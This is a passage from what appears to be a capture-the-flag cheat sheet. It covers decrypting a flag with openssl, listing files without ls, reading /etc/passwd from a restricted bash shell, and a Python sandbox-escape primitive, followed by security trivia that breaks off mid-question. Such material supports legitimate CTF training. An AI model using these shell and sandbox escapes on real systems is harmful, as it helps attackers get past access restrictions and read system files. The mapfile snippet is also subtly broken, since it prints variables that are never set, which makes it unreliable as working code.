openssl enc -d -aes-256-ecb -in <(printf %s '5a2a99d3baa07bfbd08b961205dcae887fb0acf9f272929baa7911faa4ae7751' | xxd -r -p) -K '6fb3b5b05966fb06518ce6706ec933e79cfaea8f12b4485cba56321c7a62a077'
MCA{I$love$bitcoin$so$much!}
```

* Missing `ls` or `dir` commands

	If you cannot run `ls` or `dir`, or `find` or `grep`, to list files you can use 

```
echo *
echo /any/path/*
```


* restricted bash (`rbash`) read files

	If you are a restricted shell like `rbash` you can still read any file with some builtin commands like `mapfile`:

```
mapfile -t  < /etc/passwd
printf "$s\n" "${anything[@]}"
```

Jail Breaks	
----------
Sometimes you're jailed in an environment where you can potentially execute code.    
* Python 3    
`().__class__.__base__.__subclasses__()` - Gives access to `object` subclasses    


Trivia
-------------

* The British used this machine to crack the German Enigma machine messages.

```
Bombe
```

* What is the Windows LM hash for a blank password?

```
aad3b435b51404eeaad3b435b51404ee
```

* for Windows LM hashing, after the password is split into two 7 character chunks, they are used as DES keys to encrypt what string?

```
KGS!@#$%
```

* I am the person responsible for stopping one of the worst ransomware. Who am I?

```
MalwareTech
```

* I am used by devices for sending error messages. Who am I?

```
